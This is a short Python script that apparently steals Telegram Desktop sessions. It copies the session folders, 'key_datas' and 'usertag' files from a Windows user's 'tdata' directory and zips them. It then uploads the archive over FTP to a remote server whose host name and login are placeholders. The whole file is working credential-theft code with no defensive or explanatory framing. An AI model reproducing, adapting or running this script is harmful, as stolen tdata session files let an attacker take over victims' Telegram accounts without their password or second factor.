import os
import os.path
import shutil
import glob
from datetime import datetime
from ftplib import FTP
from zipfile import ZipFile

now = datetime.now()
name_archive = str(now.strftime("%d_%m_%y_%I_%M"))

# Get current user home
pathusr = os.path.expanduser('~')
# Set tdata folder location
tdata_path = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\'
tdata_session_zip = pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' + name_archive + ".zip"

# Creating folders
os.mkdir(tdata_path + '\\connection_hash')
os.mkdir(tdata_path + '\\map')

# Copy all session folders
folders = [folder for folder in os.listdir(tdata_path) if len(folder) >= 15 and os.path.isdir(os.path.join(tdata_path, folder))]
for folder in folders:
    shutil.copytree(os.path.join(tdata_path, folder), os.path.join(tdata_path, 'map', folder))

# Copying files (+usertag)
files16 = glob.iglob(os.path.join(tdata_path, "??????????*"))
usertag_file = os.path.join(tdata_path, "usertag")
files16 = [usertag_file] + list(files16)
for file in files16:
    if os.path.isfile(file):
        shutil.copy2(file, tdata_path + '\\connection_hash')

#Key_data
key_data = glob.iglob(os.path.join(tdata_path , "key_datas"))
for file in key_data:
    if os.path.isfile(file):
        shutil.copy2(file, tdata_path + '\\connection_hash')

#Archivation folders
with ZipFile(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\session.zip','w') as zipObj:
   # Iterate over all the files in directory
   for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\map'):
       for filename in filenames:
           #create complete filepath of file in directory
           filePath = os.path.join(folderName, filename)
           # Add file to zip
           zipObj.write(filePath)

   for folderName, subfolders, filenames in os.walk(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata\\connection_hash'):
       for filename in filenames:
           #create complete filepath of file in directory
           filePath = os.path.join(folderName, filename)
           # Add file to zip
           zipObj.write(filePath)

shutil.rmtree(tdata_path + '\\connection_hash')
shutil.rmtree(tdata_path + '\\map')

old_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\', 'session.zip')
new_file = os.path.join(pathusr + '\\AppData\\Roaming\\Telegram Desktop\\' , name_archive + ".zip")
os.rename(old_file, new_file)

# FTP module to connect server
ftp = FTP()
ftp.set_debuglevel(2)
ftp.connect('Host_Name', 21)
ftp.login('User_Name', 'Password')
ftp.cwd('/htdocs/tgtest')

# Sending file on FTP server
print(ftp.dir())
fp = open(tdata_session_zip, 'rb')
ftp.storbinary('STOR %s' % os.path.basename(name_archive + ".zip"), fp, 1024)
fp.close()

